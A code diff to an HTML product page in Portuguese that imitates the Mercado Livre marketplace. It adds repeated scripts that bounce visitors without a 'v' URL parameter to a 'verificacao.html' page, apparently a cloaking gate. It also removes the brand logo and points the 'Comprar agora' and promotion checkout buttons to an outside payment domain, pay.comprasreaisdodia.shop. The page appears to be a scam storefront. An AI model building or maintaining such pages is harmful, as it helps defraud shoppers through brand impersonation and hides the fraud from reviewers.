@@ -1,4 +1,17 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
+<script>
+(function() {
+  var params = new URLSearchParams(window.location.search);
+  if (!params.has("v")) {
+    window.location.replace("verificacao.html" + window.location.search);
+  }
+})();
+</script>
+<script>
+if (window.location.pathname.endsWith('/index.html') || window.location.pathname.endsWith('index.html')) {
+  window.location.replace('verificacao.html' + window.location.search);
+}
+</script>
   <script>
   window.pixelId = "66a3fc115f57e7496bcf1525";
   var a = document.createElement("script");
@@ -940,13 +953,26 @@
     </div>
 
     <header class="ml-header-container" id="dynamicHeader">
+<script>
+(function() {
+  var params = new URLSearchParams(window.location.search);
+  if (!params.has("v")) {
+    window.location.replace("verificacao.html" + window.location.search);
+  }
+})();
+</script>
+<script>
+if (window.location.pathname.endsWith('/index.html') || window.location.pathname.endsWith('index.html')) {
+  window.location.replace('verificacao.html' + window.location.search);
+}
+</script>
       <div class="header-content-wrapper">
         <div class="header-full">
           <div class="header-top-row">
             <div class="header-left">
               <i class="fa-solid fa-bars icon-btn"></i>
             </div>
-            <img src="images/logo.png" alt="Mercado Livre" class="header-logo-full">
+            
             <div class="header-right">
               <div class="cart-container">
                 <i class="fa-solid fa-cart-shopping icon-btn"></i>
@@ -1074,7 +1100,7 @@
         <a href="#"
 id="btn-buy-now"
 class="btn-buy"
-onclick="fbq('track','AddToCart'); fbq('track','InitiateCheckout'); window.location.href='https://pay.comprasreaisdodia.com/xQBPZvl5kP6gmVq'; return false;">
+onclick="fbq('track','AddToCart'); fbq('track','InitiateCheckout'); window.location.href='https://pay.comprasreaisdodia.shop/xQBPZvl5kP6gmVq'; return false;">
 Comprar agora
 </a>
       </div>
@@ -1435,7 +1461,7 @@ Comprar agora
        <a href="#"
 id="btn-buy-now"
 class="btn-buy"
-onclick="fbq('track','AddToCart'); fbq('track','InitiateCheckout'); window.location.href='https://pay.comprasreaisdodia.com/xQBPZvl5kP6gmVq'; return false;">
+onclick="fbq('track','AddToCart'); fbq('track','InitiateCheckout'); window.location.href='https://pay.comprasreaisdodia.shop/xQBPZvl5kP6gmVq'; return false;">
 🔥 FINALIZAR MINHA PROMOÇÃO
 </a>
       </div>
@@ -1544,3 +1570,7 @@ onclick="fbq('track','AddToCart'); fbq('track','InitiateCheckout'); window.locat
   
 
 </body></html>
+
+
+
+
